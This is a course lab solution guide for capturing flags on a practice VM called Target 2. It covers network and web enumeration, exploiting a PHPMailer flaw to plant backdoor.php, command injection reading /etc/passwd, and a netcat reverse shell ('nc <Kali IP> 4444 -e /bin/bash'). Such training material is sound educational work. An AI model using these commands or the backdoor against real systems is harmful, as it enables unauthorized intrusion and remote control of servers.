## Solution Guide: Attacking Target 2

This solution file details the steps for  capturing the first three flags on Target 2.

1. Use Nmap to identify the IP address of Target 2.

    ```bash
    # Reveals Target 2 at `192.168.1.115`
    $ nmap -sP 192.168.1.1-255
    ```

2. Use Nmap to document all exposed ports and services at this IP address.

    ```bash
    # Reveals Target 2 at `192.168.1.115`
    $ nmap -sV 192.168.1.115
    ```

3. Enumerate the web server with `nikto`.

     - **Hint**: Run: `nikto -C all -h <URL>`.
     - **Note**: This creates a list of URLs the Target HTTP server exposes. What kind of website is this VM running?

    ```bash
    # Generate a list of discovered URLs
    # Note that this discovers `wordpress` directories
    $ nikto -C all -h http://192.168.1.115
    ```

4. Perform a more in-depth enumeration with `gobuster`.
 
    ```bash
    $ gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://192.168.1.115
    ```
 
   Navigating to `http://192.168.1.115/vendor` reveals a `flag1.txt` in the directory.

5. Use “searchsploit” to find any known vulnerabilities associated with the programs found in Step #4.
    
    - Run: `searchsploit phpmailer` 

6. Use the `exploit.sh` script to exploit this vulnerability by opening an ncat connection to your Kali VM.
    
    - The easiest way to get the script onto the Kali VM is to use a web text/paste service like https://pastebin.com to copy the script from your local machine to the web, and then retrieve it from the Kali Machine.

    - Edit the line at the top of the script that sets the `TARGET` variable. Set it equal to the IP address of Target 2.

    - Run the script. It uploads a file called `backdoor.php` to the target server. This file can be used to execute **command injection attacks**.

    - Navigate to `http://<Target 2 URL>/backdoor.php?cmd=<CMD>`.

      - This allows you to run bash commands on Target 2.
      - For example, try: `http://<Target 2 URL>/backdoor.php?cmd=cat%20/etc/passwd`

    - Next, use the backdoor to open a shell session on the target.

      - On your **Kali** VM, start a netcat listener with `nc -lnvp 4444`.
      - In the browser, use the backdoor to run: `nc <Kali IP> 4444 -e /bin/bash`. For example, your query string will look like `cmd=nc%20<Kali IP>%204444%20-e%20/bin/bash`.

    **Solution**

      - First, edit line 4 in `exploit.sh` to read: `TARGET=http://192.168.1.115/contact.php`.

      - Then, execute the script: `bash exploit.sh`

      - Next, start an ncat listener with `nc -lvp 4444`

      - Finally, navigate to the following URL in the browser: `http://192.168.1.115?cmd=nc%20<Kali IP>%204444%20-e%20/bin/bash`.

7. Using the shell you've opened on `Target 2`, find a `flag` in `/var/www`.

    ```bash
    $ ls /var/www
    flag2.txt
    ```

8. Next, find a flag in the WordPress uploads directory.
     
     - **Hint**: Use the `find` command: `find /var/www -type f -iname 'flag*'`

      ```bash
      $ find /var/www/html -type f -iname 'flag*'
      /var/www/html/wp-content/uploads/2018/11/flag3.txt
      ```

9. If you find all three flags -- congratulations! There is a fourth, but escalating to `root` is extremely difficult. For now, move on to completing a report about Target 2.

An complete online solution guide for Target 2 is available [here.](https://hackso.me/raven-2-walkthrough/).

---

© 2021 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.
